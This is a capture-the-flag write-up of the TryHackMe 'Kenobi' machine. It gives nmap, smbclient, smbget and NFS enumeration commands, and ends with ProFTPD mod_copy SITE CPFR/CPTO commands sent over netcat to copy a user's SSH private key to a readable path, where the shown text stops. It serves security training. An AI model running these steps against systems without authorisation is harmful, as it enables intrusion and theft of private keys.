# Kenobi
My own Writeup of machine Kenobi (Tryhackme)

¡¡¡ IMPORTANT !!!
### First of all, connect to your tryhackme vpn.
¡¡¡ IMPORTANT !!!

1. Scan the machine, i use this command to scan open ports in the machine:

````nmap -T5 -p- -n -v <ip>````
  
![Screenshot_1](https://user-images.githubusercontent.com/80575736/111028536-849d6380-83f7-11eb-8356-e13b67d6fe01.png)

With this information we can show a few open ports, for example port 21 (ftp), port 22 (ssh), port 111 (rpcbind) port 445 (smb), port 139 (NetBios) and port 445 (Shared_folders SMB)

In this machine we have to explotate SMB shared folders port (445), and ftp (21)

2. When we have open ports in the machine, we have to try internal nmap scripts to see a few vulnerabilities. We can try with this:

```nmap --script=vuln <ip> ```

For my i try this command and works better for me:

``` nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <ip>```

![Screenshot_2](https://user-images.githubusercontent.com/80575736/111028824-87995380-83f9-11eb-881f-44023f30b244.png)

This command show the shared folders of the vulnerable machine, and we can watch a share with name "anonymous".

3. Connect with smbclient to see what there is in.

``` smbclient //<ip>/shared_folder```

![Screenshot_3](https://user-images.githubusercontent.com/80575736/111029377-b533cc00-83fc-11eb-8e64-8c7367b52469.png)

To show subfolders and files, we can use command ```ls``` like in linux terminal.

![Screenshot_16](https://user-images.githubusercontent.com/80575736/111029450-ef04d280-83fc-11eb-8ffb-360bad8ad4dd.png)

We see a  intersting file name log.txt

4. Copy the previous file (log.txt) in our machine.

```smbget -R smb://<ip>/shared_folder```
This command copy all folders and files recursively.

![Screenshot_4](https://user-images.githubusercontent.com/80575736/111029700-55d6bb80-83fe-11eb-90cc-44e8729870bc.png)

When we read file log.txt, we can appreciate:
- Information generated for Kenobi when generating an SSH key for the user
- Information about the ProFTPD server.

5. In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

```nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <ip>```

![Screenshot_5](https://user-images.githubusercontent.com/80575736/111030205-4e64e180-8401-11eb-85a2-7e27491d9d16.png)

This command provide us folder of file systems mounted by clients. in our case /var 

6. We go to search a exploit of the ftp server of the vulnerable machine "proftpd".

``` searchsploit proftpd 1.3.5```

![Screenshot_6](https://user-images.githubusercontent.com/80575736/111030486-cb448b00-8402-11eb-8d99-e29502e59f14.png)

We execute the previous command, and its show three exploits of service "proftpd"


7. Go to connect to ftp server via netcat with this command:

``` nc <ip> <port> ```

![Screenshot_7](https://user-images.githubusercontent.com/80575736/111030610-8a00ab00-8403-11eb-9848-c6991de16fb9.png)

Now we are inside ftp server, and we have to use this command to copy id_rsa to before connect via ssh to gain access with the user Kenobi.

```site CPFR /home/kali/.ssh/id_rsa ```
``` site CPTO /var/tmp/id_rsa```

![Screenshot_8](https://user-images.githubusercontent.com/80575736/111030943-54f55800-8405-11eb-9bd9-4099600dcf03.png)




